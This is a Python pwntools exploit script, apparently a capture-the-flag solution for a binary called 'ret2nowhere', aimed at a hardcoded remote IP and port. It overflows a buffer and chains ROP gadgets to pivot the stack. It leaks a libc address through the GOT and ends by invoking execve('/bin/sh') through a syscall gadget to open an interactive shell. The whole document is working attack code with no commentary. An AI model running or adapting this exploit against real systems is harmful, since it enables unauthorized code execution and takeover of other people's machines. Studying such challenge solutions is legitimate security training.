#!/usr/bin/env python3
from pwn import *
import ctypes

exe=ELF("./ret2nowhere")

libc = exe.libc
#if args.REMOTE:
 #   libc = ELF("./libc.so.6")

HOST, PORT = "35.228.220.66", 1337

context.binary = exe

# Constants

GDBSCRIPT = '''\
b* vuln+37
c
'''
CHECKING = True

pop_rdi = 0x400593
pop_rsi_r15 = 0x400591
pop_rbp = 0x400468

leave_ret = 0x40050c

ret = 0x4003de

plt_read = 0x4003f6
def pad(pay):
    return pay + (200-len(pay))*b'A'

def main():
    global io
    io = conn()

    RW_AREA = 0x601000 + 0xd00
    payload = flat(
        64*b'A',
        RW_AREA,
        pop_rsi_r15,
        RW_AREA,
        0,
        exe.symbols['vuln']+30  # call to read
    )
    
    io.send(pad(payload))
    
    pum = flat(
        RW_AREA+8,
        exe.symbols['vuln']
    )
    
    io.send(pad(pum))
    
    RW_2 = 0x601000+0x200
    
    payload = flat(
        64*b'A',
        RW_AREA + 8*5,
        pop_rsi_r15,
        exe.got['read'],
        0,
        exe.symbols['vuln']+30,
        pop_rdi,
        1,
        pop_rbp,
        RW_AREA+8*10,
        exe.symbols['vuln']+30,
        pop_rdi,
        0,
        pop_rsi_r15,
        RW_2,
        0,
        plt_read,
        exe.symbols['vuln'],   
    )
    
    io.send(pad(payload)+b'\x2f')
    
    
    buf = io.recv()[:8]
    
    print(buf)
    libc.address = leak(buf,libc.symbols['read']+0xf,'libc',verbose=True)
    
    bin_sh = next(libc.search(b"/bin/sh\0"))
    
    payload  = b"/bin/sh\0"
    
    io.send(pad(payload))
    
    rop = ROP(libc)
    
    pop_rax= rop.find_gadget(['pop rax', "ret"]).address
    pop_rdx= rop.find_gadget(['pop rdx', "ret"]).address
    syscall= rop.find_gadget(['syscall']).address
    
    payload = flat(
        64*b'A',
        RW_AREA,
        pop_rax,
        59,
        pop_rsi_r15,
        0,
        0,
        pop_rdi,
        bin_sh,
        pop_rdx,
        0,
        syscall,
        ret
    )
    
    io.sendline(pad(payload))
    io.interactive()
    


def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
